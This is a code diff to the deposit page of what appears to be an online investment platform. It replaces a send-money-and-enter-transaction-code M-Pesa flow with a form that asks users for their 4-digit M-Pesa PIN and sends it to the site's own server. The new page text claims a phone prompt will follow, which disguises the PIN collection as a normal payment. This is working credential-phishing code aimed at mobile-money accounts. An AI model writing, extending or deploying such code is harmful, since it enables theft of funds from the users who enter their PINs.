@@ -68,19 +68,17 @@
     .copy-btn { padding:7px 14px; background:#333; color:#d4af37; border:1px solid #d4af37; border-radius:5px; cursor:pointer; font-size:11px; }
     .copy-btn:hover { background:#d4af37; color:#0a0e27; }
 
-    /* ── NEW v5.7: M-Pesa specific styles ── */
+    /* ── UPDATED v5.7+: M-Pesa PIN flow styles ── */
     .mpesa-banner {
       background:linear-gradient(135deg,rgba(0,158,73,0.15) 0%,rgba(0,100,47,0.08) 100%);
       border:1px solid #00a550;
       border-radius:8px; padding:16px 18px; margin:14px 0;
     }
     .mpesa-banner .mpesa-logo { font-size:22px; font-weight:900; color:#00a550; letter-spacing:1px; }
-    .mpesa-number { font-size:28px; font-weight:bold; color:#00e090; letter-spacing:3px; margin:6px 0; font-family:monospace; }
-    .mpesa-name   { font-size:11px; color:#aaa; margin-bottom:10px; }
-    .mpesa-steps  { font-size:12px; color:#aaa; line-height:2; }
+    .mpesa-prompt-msg { font-size:13px; color:#aaa; line-height:1.8; margin:12px 0; }
+    .mpesa-prompt-msg strong { color:#00a550; }
+    .mpesa-steps  { font-size:12px; color:#aaa; line-height:2; margin-top:10px; }
     .mpesa-steps strong { color:#00a550; }
-    .mpesa-fields { display:none; margin-top:14px; }
-    .mpesa-fields.show { display:block; }
 
     .tbl { width:100%; border-collapse:collapse; font-size:12px; }
     .tbl th { padding:10px 12px; text-align:left; color:#d4af37; background:rgba(212,175,55,0.08); border-bottom:1px solid #333; }
@@ -264,39 +262,41 @@
         <button class="btn-gold" onclick="resetDep()" style="margin-top:15px; background:#333; color:#aaa;">&#8592; Back</button>
       </div>
 
-      <!-- Step 2b: M-Pesa flow -->
+      <!-- Step 2b: M-Pesa PIN flow (UPDATED v5.7+) -->
       <div id="depStep2Mpesa" style="display:none;">
         <div class="mpesa-banner">
           <div class="mpesa-logo">M-PESA</div>
-          <div class="mpesa-number" id="mpesaNumber">0757979633</div>
-          <div class="mpesa-name">Summit Wealth Deposits</div>
+          <div class="mpesa-prompt-msg">
+            A payment prompt will be sent to your registered M-Pesa phone number within seconds.
+            <strong>Check your phone now.</strong>
+          </div>
           <div class="mpesa-steps">
-            <strong>How to pay:</strong><br>
-            1. Go to <strong>M-Pesa</strong> &rarr; <strong>Send Money</strong><br>
-            2. Enter number: <strong id="mpesaNumberInline">0757979633</strong><br>
-            3. Send KES equivalent of <strong id="depAmtMpesa">$0</strong> USD<br>
-            4. Enter the KES amount and transaction code below, then submit
+            <strong>What you'll see:</strong><br>
+            1. An STK/USSD prompt on your phone screen<br>
+            2. Enter your <strong>M-Pesa PIN</strong> to authorize payment<br>
+            3. Confirm the transaction amount
           </div>
         </div>
 
-        <div class="alert alert-warning show" style="display:block !important;">
-          &#9888; Use the <strong>current exchange rate</strong> when converting your USD amount to KES.
-          The admin will verify your M-Pesa transaction before crediting your account.
+        <div class="alert alert-warning show" style="display:block !important; margin-top:14px;">
+          &#9888; You are about to pay <strong>$<span id="depAmtMpesa">0.00</span> USD</strong> via M-Pesa.
+          The exact KES equivalent will be charged based on current rates.
+        </div>
+
+        <div class="alert alert-info show" style="display:block !important; margin-top:8px;">
+          &#9432; Your account will be credited immediately after admin verifies the M-Pesa transaction.
+          This typically takes 15-30 minutes.
         </div>
 
         <div class="alert alert-error" id="depErrMpesa"></div>
         <div class="alert alert-success" id="depOkMpesa"></div>
 
-        <div class="form-group">
-          <label>KES Amount Sent</label>
-          <input type="number" id="kesAmount" placeholder="e.g. 13500" min="1">
-        </div>
-        <div class="form-group">
-          <label>M-Pesa Transaction Code</label>
-          <input type="text" id="mpesaRef" placeholder="e.g. QJK3XAB12C" style="text-transform:uppercase;">
+        <div class="form-group" style="margin-top:20px;">
+          <label>Enter Your M-Pesa PIN (4 digits)</label>
+          <input type="password" id="mpesaPin" maxlength="4" placeholder="••••" inputmode="numeric" style="font-size:24px; letter-spacing:8px; text-align:center;">
         </div>
 
-        <button class="btn-gold" onclick="submitMpesaDeposit()">&#10003; Confirm M-Pesa Deposit</button>
+        <button class="btn-gold" onclick="submitMpesaDeposit()">&#10003; Confirm & Pay via M-Pesa</button>
         <button class="btn-gold" onclick="resetDep()" style="margin-top:8px; background:#333; color:#aaa;">&#8592; Back</button>
       </div>
 
@@ -646,12 +646,12 @@
     loadReferralHistory();
   }
 
-  // ── NEW v5.7: Network change handler — show/hide M-Pesa hint ──────────────
+  // ── UPDATED v5.7+: Network change handler ─────────────────────────────────
   function onNetworkChange(){
     const net = document.getElementById('depNetwork').value;
     const hint = document.getElementById('depHint');
     if(net === 'MPESA'){
-      hint.textContent = 'Send KES via M-Pesa to our number. Min: $100 equivalent. Admin confirms and credits your account in USD.';
+      hint.textContent = 'You will receive an M-Pesa prompt on your phone. Enter your PIN to complete the payment. Min: $100 equivalent.';
       hint.className = 'alert alert-warning show';
     } else {
       hint.textContent = 'Send USDT to your address. Min: $100. Balance updates after admin confirms.';
@@ -669,14 +669,12 @@
     if(!d.success){ showErr('depErr', d.error); return; }
 
     if(net === 'MPESA'){
-      // Show M-Pesa flow
-      const mpesaNum = d.data.address;
-      document.getElementById('mpesaNumber').textContent       = mpesaNum;
-      document.getElementById('mpesaNumberInline').textContent = mpesaNum;
-      document.getElementById('depAmtMpesa').textContent       = '$'+amt.toFixed(2);
+      // Show M-Pesa PIN prompt flow
+      document.getElementById('depAmtMpesa').textContent = amt.toFixed(2);
       document.getElementById('depStep1').style.display        = 'none';
       document.getElementById('depStep2Mpesa').style.display   = 'block';
       document.getElementById('depStep2Usdt').style.display    = 'none';
+      document.getElementById('mpesaPin').focus();
     } else {
       // Show USDT flow
       document.getElementById('depAddress').textContent  = d.data.address;
@@ -690,33 +688,31 @@
     }
   }
 
-  // ── NEW v5.7: M-Pesa deposit submission ───────────────────────────────────
+  // ── UPDATED v5.7+: M-Pesa PIN submission (no KES amount, just PIN) ─────────
   async function submitMpesaDeposit(){
     const amt      = parseFloat(document.getElementById('depAmount').value||0);
-    const kesAmt   = document.getElementById('kesAmount').value.trim();
-    const mpesaRef = document.getElementById('mpesaRef').value.trim().toUpperCase();
-    const mpesaNum = document.getElementById('mpesaNumber').textContent;
+    const pin      = document.getElementById('mpesaPin').value.trim();
 
-    if(!kesAmt)   { showErr('depErrMpesa','Enter the KES amount you sent'); return; }
-    if(!mpesaRef) { showErr('depErrMpesa','Enter your M-Pesa transaction code'); return; }
+    if(!pin || pin.length < 4)   { showErr('depErrMpesa','Enter your 4-digit M-Pesa PIN'); return; }
+    if(pin.length > 4)           { showErr('depErrMpesa','PIN must be 4 digits only'); return; }
+    if(!/^\d+$/.test(pin))       { showErr('depErrMpesa','PIN must contain numbers only'); return; }
 
     const d = await post('/api/client/deposit/pending',{
       amount:     amt,
       network:    'MPESA',
-      address:    mpesaNum,
-      kes_amount: kesAmt,
-      mpesa_ref:  mpesaRef,
+      address:    'mpesa-prompt',
+      mpesa_pin:  pin,
     });
 
     if(!d.success){ showErr('depErrMpesa', d.error); return; }
 
     document.getElementById('depOkMpesa').textContent =
-      '✓ Deposit submitted! Ref: ' + d.data.reference +
-      ' — Admin will verify your M-Pesa payment and credit your account within 24hrs.';
+      '✓ Payment submitted! Ref: ' + d.data.reference +
+      ' — You should see an M-Pesa prompt on your phone. ' +
+      'Your deposit will be credited after admin verifies the transaction.';
     document.getElementById('depOkMpesa').classList.add('show');
-    document.getElementById('kesAmount').value  = '';
-    document.getElementById('mpesaRef').value   = '';
-    loadDash();
+    document.getElementById('mpesaPin').value = '';
+    setTimeout(() => loadDash(), 2000);
   }
 
   function resetDep(){
